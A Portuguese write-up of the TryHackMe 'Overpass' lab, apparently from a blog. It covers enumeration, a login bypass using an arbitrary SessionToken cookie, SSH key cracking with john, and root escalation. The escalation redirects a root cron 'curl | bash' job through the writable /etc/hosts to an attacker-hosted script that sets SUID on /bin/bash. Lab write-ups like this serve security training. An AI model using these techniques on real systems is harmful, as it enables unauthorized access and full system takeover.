---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - Overpass - Fácil
date: 2024-04-03 21:02:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, linux, web, facil, crontab]     # TAG names should always be lowercase
show_image_post: true
---

![Logo](/assets/img/overpass/logo.png){: w="100" h="100" .left}

---
# **CTF - Overpass** 
---
---  
## **Enumeração**

### nmap

```shell
─ sudo nmap -sV -Pn -sS --min-rate 10000 -p- -oA nmap 10.10.187.0
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-14 23:38 -03
Warning: 10.10.187.0 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.187.0
Host is up (0.36s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.79 seconds
```
{: .nolineno }

Porta 80

![alt text](/assets/img/overpass/1.png)

![alt text](/assets/img/overpass/2.png)

![alt text](/assets/img/overpass/3.png)

### ffuf

```shell
─ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.253.145/FUZZ -e .php,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.253.145/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .php .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

404.html                [Status: 200, Size: 782, Words: 116, Lines: 26, Duration: 344ms]
aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 344ms]
admin                   [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 344ms]
admin.html              [Status: 200, Size: 1525, Words: 269, Lines: 40, Duration: 344ms]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 344ms]
downloads               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 344ms]
img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 344ms]
index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 344ms]
:: Progress: [61428/61428] :: Job [1/1] :: 122 req/sec :: Duration: [0:08:54] :: Errors: 0 ::
```
{: .nolineno }

**admin.html**

![alt text](/assets/img/overpass/4.png)

**script de login**

![alt text](/assets/img/overpass/5.png)

```java
   const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
{: .nolineno }

O código permite login com Cookie, setando um cookie pra ver que acontece.

No navegador adicionei SessionToken como está no código, e path apenas /

![alt text](/assets/img/overpass/6.png)

Via burp pode adicionar na request.

Cookie: SessionToken=qualquervalor

Ficando dessa forma 

```text
POST /api/login HTTP/1.1
Host: 10.10.253.145
Content-Length: 30
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.253.145
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: SessionToken=test teste
Connection: close

username=asasa&password=asasas
```
{: .nolineno }

## **Acesso/Foothold**

Refresh na página e logado com sucesso e uma sshkey.

![alt text](/assets/img/overpass/7.png)


### john

Crackeando a key com john.

```shell
╭─ ~/thm/overpass    
╰─ ssh2john sshkey >> hash.txt
╭─ ~/thm/overpass  
╰─ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (sshkey)     
1g 0:00:00:00 DONE (2024-03-18 00:11) 2.127g/s 28459p/s 28459c/s 28459C/s pimentel..handball
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno }


Conectando via ssh
### user flag

```shell
╭─ ~/thm/overpass    
╰─ chmod 600 sshkey                                 
╭─ ~/thm/overpass    
╰─ ssh -i sshkey james@10.10.253.145
Enter passphrase for key 'sshkey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 18 03:14:29 UTC 2024


james@overpass-prod:~$ ls -la
total 48
drwxr-xr-x 6 james james 4096 Jun 27  2020 .
drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
drwx------ 2 james james 4096 Jun 27  2020 .cache
drwx------ 3 james james 4096 Jun 27  2020 .gnupg
drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
drwx------ 2 james james 4096 Jun 27  2020 .ssh
-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
james@overpass-prod:~$ 
```
{: .nolineno }

![alt text](/assets/img/overpass/8.png)

## **Escalação Privilégio**

Notei que tinha o arquivo .overpass que é o arquivo que salva as senhas do aplicativo.
Transferi pra minha home e executei o overpassLinux selecionei a opção 4.

![alt text](/assets/img/overpass/9.png)

A senha é do usuário james, james não possui acesso ao sudo.

```shell
james@overpass-prod:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on overpass-prod.
```
{: .nolineno }

Resolvi olhar o crontab.

### crontab

```shell
james@overpass-prod:/etc$ cat crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
{: .nolineno }

Esse script `buildscript.sh` roda a cada minuto.  
Tentei alterar o curl e o script provavelmente esta em algum diretório que somente root tem acesso.

Porém é possível alterar o arquivo hosts e setar o host `overpass.thm` para meu ip.

`james@overpass-prod:/usr/bin$ ls -la /etc/hosts`  
`-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts`  

A ideia aqui é fazer o curl executado pelo crontab buscar o endereço em meu servidor web em python, sendo assim coloco o que quiser no script.

![alt text](/assets/img/overpass/10.png)

Criei a estrutura de pastas em minha máquina junto do script,
`/downloads/src/buildscript.sh`  

e no script para adicionar SUID no bash.

`#!/bin/bash`  
`chmod u+s /bin/bash`
### root flag
![alt text](/assets/img/overpass/11.png)